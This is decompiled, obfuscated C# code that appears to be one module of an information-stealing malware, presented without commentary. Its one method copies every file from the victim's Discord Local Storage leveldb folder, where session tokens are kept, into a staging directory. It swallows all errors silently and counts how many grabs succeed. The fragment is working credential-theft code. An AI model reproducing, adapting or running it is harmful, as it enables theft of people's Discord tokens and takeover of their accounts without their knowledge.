using System;
using System.IO;
using Moist;

// Token: 0x02000048 RID: 72
internal class Class14
{
	// Token: 0x06000208 RID: 520 RVA: 0x00010434 File Offset: 0x0000E634
	public static void smethod_0(string string_1)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + Class14.string_0).GetFiles())
			{
				Directory.CreateDirectory(string_1 + "\\Discord\\Local Storage\\leveldb\\");
				fileInfo.CopyTo(string_1 + "\\Discord\\Local Storage\\leveldb\\" + fileInfo.Name);
			}
			Class14.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000209 RID: 521 RVA: 0x0000446C File Offset: 0x0000266C
	public Class14()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x0600020A RID: 522 RVA: 0x0000510C File Offset: 0x0000330C
	// Note: this type is marked as 'beforefieldinit'.
	static Class14()
	{
		Class40.gcO0h7LzslQIW();
		Class14.int_0 = 0;
		Class14.string_0 = "\\discord\\Local Storage\\leveldb\\";
	}

	// Token: 0x040000F0 RID: 240
	public static int int_0;

	// Token: 0x040000F1 RID: 241
	public static string string_0;
}
